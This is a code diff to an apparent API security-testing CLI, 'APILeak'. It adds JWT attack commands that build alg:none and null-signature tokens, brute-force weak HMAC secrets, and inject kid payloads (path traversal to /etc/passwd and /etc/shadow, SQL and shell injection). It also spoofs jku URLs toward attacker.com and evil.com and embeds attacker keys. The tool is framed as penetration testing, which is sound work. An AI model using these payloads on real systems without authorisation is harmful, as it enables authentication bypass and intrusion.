@@ -472,45 +472,40 @@ def create_default_config(target_url, wordlist_path=None, scan_type="full", user
 @click.option('--no-banner', is_flag=True, help='Suppress banner output')
 @click.pass_context
 def cli(ctx, no_banner):
-    """
-    APILeak v0.1.0 - Enterprise API Fuzzing Tool
+    """APILeak v0.1.0 - Enterprise API Fuzzing Tool
     
+    \b
     Performs comprehensive security testing of APIs including:
-    - Traditional endpoint and parameter fuzzing
-    - OWASP API Security Top 10 testing
-    - Advanced vulnerability detection with framework detection
-    - Version fuzzing and subdomain discovery
-    - WAF detection and evasion techniques
-    - Advanced payload encoding and obfuscation
-    - CORS analysis and security headers testing
-    - Multi-format reporting with CI/CD integration
-    - JWT token manipulation and analysis
+    • Traditional endpoint and parameter fuzzing
+    • OWASP API Security Top 10 testing  
+    • Advanced vulnerability detection with framework detection
+    • Version fuzzing and subdomain discovery
+    • WAF detection and evasion techniques
+    • Advanced payload encoding and obfuscation
+    • CORS analysis and security headers testing
+    • Multi-format reporting with CI/CD integration
+    • JWT token manipulation and analysis
     
-    Examples:
-      # Basic fuzzing modes
-      python apileaks.py dir -w /path/wordlist --target https://api.example.com
-      python apileaks.py par --target https://api.example.com --user-agent-random
-      
-      # Full comprehensive scans
-      python apileaks.py full --config config/api_config.yaml --target https://api.example.com
-      python apileaks.py full --target https://api.example.com --enable-advanced
-      
-      # Advanced feature examples
-      python apileaks.py full --target https://api.example.com --detect-framework --fuzz-versions
-      python apileaks.py full --target https://api.example.com --enable-payload-encoding --enable-waf-evasion
-      python apileaks.py full --target https://api.example.com --enable-subdomain-discovery --enable-cors-analysis
-      
-      # CI/CD integration examples
-      python apileaks.py full --target https://api.example.com --ci-mode --fail-on high
-      python apileaks.py full --target https://api.example.com --ci-mode --fail-on critical --modules bola,auth
-      
-      # JWT utilities
-      python apileaks.py jwt-decode eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...
-      python apileaks.py jwt-encode '{"sub":"user123"}' --secret mysecret
-      
-      # WAF evasion examples
-      python apileaks.py full --target https://api.example.com --user-agent-random --enable-waf-evasion
-      python apileaks.py full --target https://api.example.com --user-agent-file wordlists/user_agents.txt
+    \b
+    Basic Commands:
+      python apileaks.py dir --target URL              # Directory fuzzing
+      python apileaks.py par --target URL              # Parameter fuzzing  
+      python apileaks.py full --target URL             # Full security scan
+    
+    \b
+    Advanced Examples:
+      python apileaks.py full --target URL --enable-advanced
+      python apileaks.py full --target URL --detect-framework --fuzz-versions
+      python apileaks.py full --target URL --user-agent-random --enable-waf-evasion
+    
+    \b
+    CI/CD Integration:
+      python apileaks.py full --target URL --ci-mode --fail-on critical
+    
+    \b
+    JWT Utilities:
+      python apileaks.py jwt decode TOKEN
+      python apileaks.py jwt encode '{"sub":"user"}' --secret key
     """
     ctx.ensure_object(dict)
     ctx.obj['no_banner'] = no_banner
@@ -541,7 +536,14 @@ def cli(ctx, no_banner):
 @click.option('--fuzz-versions', '--fv', is_flag=True, help='Enable API version fuzzing during directory discovery')
 @click.pass_context
 def dir(ctx, target, wordlist, output, log_level, log_file, json_logs, rate_limit, methods, user_agent_random, user_agent_custom, user_agent_file, jwt, response, status_code, detect_framework, fuzz_versions):
-    """Directory/endpoint fuzzing mode - discover hidden endpoints and directories"""
+    """Directory/endpoint fuzzing - discover hidden endpoints and directories
+    
+    \b
+    Examples:
+      python apileaks.py dir --target https://api.example.com
+      python apileaks.py dir --target URL --wordlist custom.txt --rate-limit 5
+      python apileaks.py dir --target URL --user-agent-random --detect-framework
+    """
     
     # Validate user agent options
     validate_user_agent_options(user_agent_random, user_agent_custom, user_agent_file)
@@ -631,7 +633,14 @@ def dir(ctx, target, wordlist, output, log_level, log_file, json_logs, rate_limi
 @click.option('--detect-framework', '--df', is_flag=True, help='Enable framework detection during parameter fuzzing')
 @click.pass_context
 def par(ctx, target, wordlist, output, log_level, log_file, json_logs, rate_limit, methods, user_agent_random, user_agent_custom, user_agent_file, jwt, response, status_code, detect_framework):
-    """Parameter fuzzing mode - discover hidden parameters in API endpoints"""
+    """Parameter fuzzing - discover hidden parameters in API endpoints
+    
+    \b
+    Examples:
+      python apileaks.py par --target https://api.example.com/users/123
+      python apileaks.py par --target URL --jwt TOKEN --wordlist params.txt
+      python apileaks.py par --target URL --user-agent-random --rate-limit 3
+    """
     
     # Validate user agent options
     validate_user_agent_options(user_agent_random, user_agent_custom, user_agent_file)
@@ -730,7 +739,16 @@ def par(ctx, target, wordlist, output, log_level, log_file, json_logs, rate_limi
               default='critical', help='Fail CI pipeline on findings of this severity or higher')
 @click.pass_context
 def full(ctx, config, target, output, log_level, log_file, json_logs, modules, rate_limit, user_agent_random, user_agent_custom, user_agent_file, jwt, status_code, detect_framework, fuzz_versions, framework_confidence, version_patterns, enable_advanced, enable_payload_encoding, enable_waf_evasion, enable_subdomain_discovery, enable_cors_analysis, ci_mode, fail_on):
-    """Full comprehensive scan - includes fuzzing and OWASP testing with advanced features"""
+    """Full comprehensive scan - includes fuzzing and OWASP testing
+    
+    \b
+    Examples:
+      python apileaks.py full --target https://api.example.com
+      python apileaks.py full --config config.yaml --target URL
+      python apileaks.py full --target URL --modules bola,auth,property
+      python apileaks.py full --target URL --enable-advanced --jwt TOKEN
+      python apileaks.py full --target URL --ci-mode --fail-on critical
+    """
     
     # Validate user agent options
     validate_user_agent_options(user_agent_random, user_agent_custom, user_agent_file)
@@ -819,11 +837,42 @@ def full(ctx, config, target, output, log_level, log_file, json_logs, modules, r
         sys.exit(1)
 
 
-@cli.command('jwt-decode')
+# JWT Command Group
+@cli.group()
+@click.pass_context
+def jwt(ctx):
+    """JWT utilities - decode, encode, and security vulnerability testing
+    
+    \b
+    JWT Security Testing includes:
+    • Token decoding and analysis
+    • Custom token generation
+    • Algorithm confusion attacks (alg:none, null signature)
+    • Weak HMAC secret brute-force
+    • Key ID (kid) injection attacks
+    • JWKS spoofing and inline injection
+    • Blank password signature acceptance
+    
+    \b
+    Examples:
+      python apileaks.py jwt decode TOKEN
+      python apileaks.py jwt encode '{"sub":"user"}' --secret key
+      python apileaks.py jwt test-alg-none TOKEN
+      python apileaks.py jwt brute-secret TOKEN --wordlist secrets.txt
+    """
+    pass
+
+
+@jwt.command('decode')
 @click.argument('token')
 @click.pass_context
 def jwt_decode_cmd(ctx, token):
-    """Decode and analyze a JWT token"""
+    """Decode and analyze a JWT token
+    
+    \b
+    Example:
+      python apileaks.py jwt decode eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...
+    """
     try:
         decoded = decode_jwt(token)
         print_jwt_info(decoded)
@@ -845,13 +894,19 @@ def jwt_decode_cmd(ctx, token):
         sys.exit(1)
 
 
-@cli.command('jwt-encode')
+@jwt.command('encode')
 @click.argument('payload')
 @click.option('--header', default='{"alg":"HS256","typ":"JWT"}', help='JWT header as JSON string')
 @click.option('--secret', default='secret', help='Secret key for signing (default: "secret")')
 @click.pass_context
 def jwt_encode_cmd(ctx, payload, header, secret):
-    """Encode a JWT token with custom payload and header"""
+    """Encode a JWT token with custom payload and header
+    
+    \b
+    Examples:
+      python apileaks.py jwt encode '{"sub":"user123","role":"user"}'
+      python apileaks.py jwt encode '{"sub":"admin"}' --secret mysecret
+    """
     try:
         # Parse JSON strings
         try:
@@ -885,6 +940,395 @@ def jwt_encode_cmd(ctx, payload, header, secret):
         sys.exit(1)
     except Exception as e:
         click.echo(f"❌ Unexpected error: {e}", err=True)
+        sys.exit(1)
+
+
+@jwt.command('test-alg-none')
+@click.argument('token')
+@click.option('--payload', help='Custom payload to inject (JSON format)')
+@click.pass_context
+def jwt_test_alg_none(ctx, token, payload):
+    """Test algorithm confusion attack with alg:none
+    
+    \b
+    This attack attempts to bypass JWT signature verification by:
+    • Setting algorithm to "none" 
+    • Removing signature section
+    • Testing if server accepts unsigned tokens
+    
+    \b
+    Example:
+      python apileaks.py jwt test-alg-none TOKEN
+      python apileaks.py jwt test-alg-none TOKEN --payload '{"sub":"admin","role":"admin"}'
+    """
+    try:
+        click.echo("🔍 Testing Algorithm Confusion Attack (alg:none)")
+        click.echo("="*50)
+        
+        # Decode original token
+        decoded = decode_jwt(token)
+        click.echo(f"📋 Original Header: {json.dumps(decoded['header'])}")
+        click.echo(f"📋 Original Payload: {json.dumps(decoded['payload'])}")
+        
+        # Create alg:none version
+        new_header = {"alg": "none", "typ": "JWT"}
+        new_payload = json.loads(payload) if payload else decoded['payload']
+        
+        # Create unsigned token (alg:none)
+        import base64
+        header_b64 = base64.urlsafe_b64encode(json.dumps(new_header).encode()).decode().rstrip('=')
+        payload_b64 = base64.urlsafe_b64encode(json.dumps(new_payload).encode()).decode().rstrip('=')
+        
+        # alg:none tokens should have empty signature
+        unsigned_token = f"{header_b64}.{payload_b64}."
+        
+        click.echo(f"\n🎯 Generated alg:none Token:")
+        click.echo("-" * 30)
+        click.echo(unsigned_token)
+        
+        click.echo(f"\n⚠️  Security Test:")
+        click.echo("• Test this token against your API endpoints")
+        click.echo("• If accepted, the server is vulnerable to algorithm confusion")
+        click.echo("• Proper JWT libraries should reject alg:none tokens")
+        
+    except Exception as e:
+        click.echo(f"❌ Error: {e}", err=True)
+        sys.exit(1)
+
+
+@jwt.command('test-null-signature')
+@click.argument('token')
+@click.option('--payload', help='Custom payload to inject (JSON format)')
+@click.pass_context
+def jwt_test_null_signature(ctx, token, payload):
+    """Test null signature vulnerability
+    
+    \b
+    This attack tests if the server accepts tokens with:
+    • Valid header and payload
+    • Empty or null signature
+    • Signature verification bypass
+    
+    \b
+    Example:
+      python apileaks.py jwt test-null-signature TOKEN
+    """
+    try:
+        click.echo("🔍 Testing Null Signature Vulnerability")
+        click.echo("="*40)
+        
+        # Decode original token
+        decoded = decode_jwt(token)
+        new_payload = json.loads(payload) if payload else decoded['payload']
+        
+        import base64
+        header_b64 = base64.urlsafe_b64encode(json.dumps(decoded['header']).encode()).decode().rstrip('=')
+        payload_b64 = base64.urlsafe_b64encode(json.dumps(new_payload).encode()).decode().rstrip('=')
+        
+        # Create tokens with different null signature variations
+        variations = [
+            f"{header_b64}.{payload_b64}.",  # Empty signature
+            f"{header_b64}.{payload_b64}",   # No signature section
+            f"{header_b64}.{payload_b64}.null",  # Literal "null"
+            f"{header_b64}.{payload_b64}." + "{}",    # Empty object
+        ]
+        
+        click.echo("🎯 Generated Null Signature Variants:")
+        for i, variant in enumerate(variations, 1):
+            click.echo(f"\n{i}. {variant}")
+        
+        click.echo(f"\n⚠️  Security Test:")
+        click.echo("• Test each variant against your API")
+        click.echo("• If any are accepted, signature verification is bypassed")
+        
+    except Exception as e:
+        click.echo(f"❌ Error: {e}", err=True)
+        sys.exit(1)
+
+
+@jwt.command('brute-secret')
+@click.argument('token')
+@click.option('--wordlist', '-w', default='wordlists/jwt_secrets.txt', help='Wordlist file for secret brute-force')
+@click.option('--max-attempts', default=1000, help='Maximum brute-force attempts')
+@click.pass_context
+def jwt_brute_secret(ctx, token, wordlist, max_attempts):
+    """Brute-force weak HMAC secrets
+    
+    \b
+    This attack attempts to crack JWT HMAC secrets by:
+    • Testing common weak secrets
+    • Using custom wordlists
+    • Verifying signature with each secret
+    
+    \b
+    Examples:
+      python apileaks.py jwt brute-secret TOKEN
+      python apileaks.py jwt brute-secret TOKEN --wordlist custom_secrets.txt
+    """
+    try:
+        click.echo("🔍 Brute-forcing JWT HMAC Secret")
+        click.echo("="*35)
+        
+        # Check if wordlist exists
+        if not Path(wordlist).exists():
+            click.echo(f"❌ Wordlist not found: {wordlist}")
+            click.echo("Creating default wordlist...")
+            
+            # Create default wordlist
+            Path(wordlist).parent.mkdir(exist_ok=True)
+            default_secrets = [
+                "secret", "password", "123456", "admin", "jwt_secret",
+                "your_secret_key", "mysecret", "key", "token", "auth",
+                "api_key", "private_key", "hmac_secret", "signing_key",
+                "jwt_key", "access_token", "refresh_token", "session_key"
+            ]
+            
+            with open(wordlist, 'w') as f:
+                for secret in default_secrets:
+                    f.write(f"{secret}\n")
+            
+            click.echo(f"✅ Created default wordlist: {wordlist}")
+        
+        # Load secrets from wordlist
+        with open(wordlist, 'r') as f:
+            secrets = [line.strip() for line in f if line.strip() and not line.startswith('#')]
+        
+        click.echo(f"📋 Testing {min(len(secrets), max_attempts)} secrets...")
+        
+        # Decode token to get header and payload
+        decoded = decode_jwt(token)
+        
+        # Test each secret
+        found_secret = None
+        for i, secret in enumerate(secrets[:max_attempts]):
+            if i % 100 == 0:
+                click.echo(f"🔄 Progress: {i}/{min(len(secrets), max_attempts)}")
+            
+            try:
+                # Try to verify token with this secret
+                test_token = encode_jwt(decoded['header'], decoded['payload'], secret)
+                if test_token == token:
+                    found_secret = secret
+                    break
+            except:
+                continue
+        
+        if found_secret:
+            click.echo(f"\n🎉 SUCCESS! Secret found: '{found_secret}'")
+            click.echo(f"⚠️  This JWT uses a weak secret that can be brute-forced!")
+        else:
+            click.echo(f"\n❌ Secret not found in wordlist")
+            click.echo(f"💡 Try a larger wordlist or the secret may be strong")
+        
+    except Exception as e:
+        click.echo(f"❌ Error: {e}", err=True)
+        sys.exit(1)
+
+
+@jwt.command('test-kid-injection')
+@click.argument('token')
+@click.option('--kid-payload', default='../../etc/passwd', help='Kid injection payload')
+@click.pass_context
+def jwt_test_kid_injection(ctx, token, kid_payload):
+    """Test Key ID (kid) injection vulnerability
+    
+    \b
+    This attack tests kid parameter injection by:
+    • Modifying the kid header parameter
+    • Testing path traversal payloads
+    • Testing command injection payloads
+    • Testing SQL injection payloads
+    
+    \b
+    Examples:
+      python apileaks.py jwt test-kid-injection TOKEN
+      python apileaks.py jwt test-kid-injection TOKEN --kid-payload "'; DROP TABLE users; --"
+    """
+    try:
+        click.echo("🔍 Testing Key ID (kid) Injection")
+        click.echo("="*35)
+        
+        # Decode original token
+        decoded = decode_jwt(token)
+        
+        # Common kid injection payloads
+        payloads = [
+            kid_payload,
+            "../../etc/passwd",
+            "../../../etc/shadow", 
+            "/etc/passwd",
+            "'; DROP TABLE users; --",
+            "' OR '1'='1",
+            "$(whoami)",
+            "`whoami`",
+            "||whoami||",
+            "/dev/null; whoami #",
+            "key'; system('whoami'); #"
+        ]
+        
+        click.echo("🎯 Generated Kid Injection Tokens:")
+        
+        for i, payload in enumerate(payloads, 1):
+            # Modify header with kid injection
+            new_header = decoded['header'].copy()
+            new_header['kid'] = payload
+            
+            # Create new token (unsigned for testing)
+            import base64
+            header_b64 = base64.urlsafe_b64encode(json.dumps(new_header).encode()).decode().rstrip('=')
+            payload_b64 = base64.urlsafe_b64encode(json.dumps(decoded['payload']).encode()).decode().rstrip('=')
+            
+            # Keep original signature for some tests, remove for others
+            if i <= 3:  # Path traversal - keep signature
+                injected_token = f"{header_b64}.{payload_b64}.{decoded['signature']}"
+            else:  # Command/SQL injection - remove signature
+                injected_token = f"{header_b64}.{payload_b64}."
+            
+            click.echo(f"\n{i}. Kid: {payload}")
+            click.echo(f"   Token: {injected_token}")
+        
+        click.echo(f"\n⚠️  Security Test:")
+        click.echo("• Test each token against your API")
+        click.echo("• Monitor server logs for file access or command execution")
+        click.echo("• Path traversal may expose sensitive files")
+        click.echo("• Command injection may execute system commands")
+        
+    except Exception as e:
+        click.echo(f"❌ Error: {e}", err=True)
+        sys.exit(1)
+
+
+@jwt.command('test-jwks-spoof')
+@click.argument('token')
+@click.option('--jwks-url', default='http://attacker.com/jwks.json', help='Malicious JWKS URL')
+@click.pass_context
+def jwt_test_jwks_spoof(ctx, token, jwks_url):
+    """Test JWKS spoofing vulnerability
+    
+    \b
+    This attack tests JWKS URL spoofing by:
+    • Modifying jku (JWKS URL) header parameter
+    • Pointing to attacker-controlled JWKS
+    • Testing if server fetches from malicious URL
+    
+    \b
+    Example:
+      python apileaks.py jwt test-jwks-spoof TOKEN --jwks-url http://evil.com/jwks.json
+    """
+    try:
+        click.echo("🔍 Testing JWKS Spoofing")
+        click.echo("="*25)
+        
+        # Decode original token
+        decoded = decode_jwt(token)
+        
+        # Create spoofed JWKS tokens
+        jku_variations = [
+            jwks_url,
+            "http://attacker.com/jwks.json",
+            "https://evil.com/.well-known/jwks.json",
+            "http://localhost:8080/jwks.json",
+            "file:///etc/passwd",
+            "ftp://attacker.com/jwks.json"
+        ]
+        
+        click.echo("🎯 Generated JWKS Spoofing Tokens:")
+        
+        for i, jku_url in enumerate(jku_variations, 1):
+            # Modify header with jku spoofing
+            new_header = decoded['header'].copy()
+            new_header['jku'] = jku_url
+            
+            import base64
+            header_b64 = base64.urlsafe_b64encode(json.dumps(new_header).encode()).decode().rstrip('=')
+            payload_b64 = base64.urlsafe_b64encode(json.dumps(decoded['payload']).encode()).decode().rstrip('=')
+            
+            # Remove signature since we're spoofing the key source
+            spoofed_token = f"{header_b64}.{payload_b64}."
+            
+            click.echo(f"\n{i}. JKU: {jku_url}")
+            click.echo(f"   Token: {spoofed_token}")
+        
+        click.echo(f"\n⚠️  Security Test:")
+        click.echo("• Host a malicious JWKS at the specified URL")
+        click.echo("• Test each token against your API")
+        click.echo("• Monitor server for outbound requests to your URLs")
+        click.echo("• If server fetches from your URL, JWKS spoofing is possible")
+        
+        click.echo(f"\n💡 Sample Malicious JWKS:")
+        sample_jwks = {
+            "keys": [{
+                "kty": "RSA",
+                "kid": "attacker-key",
+                "use": "sig",
+                "n": "sample_modulus",
+                "e": "AQAB"
+            }]
+        }
+        click.echo(json.dumps(sample_jwks, indent=2))
+        
+    except Exception as e:
+        click.echo(f"❌ Error: {e}", err=True)
+        sys.exit(1)
+
+
+@jwt.command('test-inline-jwks')
+@click.argument('token')
+@click.pass_context
+def jwt_test_inline_jwks(ctx, token):
+    """Test inline JWKS injection vulnerability
+    
+    \b
+    This attack tests inline JWKS injection by:
+    • Embedding JWKS directly in JWT header
+    • Using jwk parameter instead of jku
+    • Testing if server trusts embedded keys
+    
+    \b
+    Example:
+      python apileaks.py jwt test-inline-jwks TOKEN
+    """
+    try:
+        click.echo("🔍 Testing Inline JWKS Injection")
+        click.echo("="*30)
+        
+        # Decode original token
+        decoded = decode_jwt(token)
+        
+        # Create malicious inline JWKS
+        malicious_jwk = {
+            "kty": "RSA",
+            "kid": "attacker-inline-key",
+            "use": "sig",
+            "n": "malicious_modulus_here",
+            "e": "AQAB"
+        }
+        
+        # Modify header with inline JWK
+        new_header = decoded['header'].copy()
+        new_header['jwk'] = malicious_jwk
+        
+        import base64
+        header_b64 = base64.urlsafe_b64encode(json.dumps(new_header).encode()).decode().rstrip('=')
+        payload_b64 = base64.urlsafe_b64encode(json.dumps(decoded['payload']).encode()).decode().rstrip('=')
+        
+        # Remove signature since we're using our own key
+        inline_token = f"{header_b64}.{payload_b64}."
+        
+        click.echo("🎯 Generated Inline JWKS Token:")
+        click.echo(f"Token: {inline_token}")
+        
+        click.echo(f"\n📋 Embedded JWK:")
+        click.echo(json.dumps(malicious_jwk, indent=2))
+        
+        click.echo(f"\n⚠️  Security Test:")
+        click.echo("• Test this token against your API")
+        click.echo("• If accepted, server trusts embedded JWK")
+        click.echo("• Attacker can sign tokens with their own key")
+        click.echo("• Proper implementation should reject inline JWKs")
+        
+    except Exception as e:
+        click.echo(f"❌ Error: {e}", err=True)
         sys.exit(1)
 
 
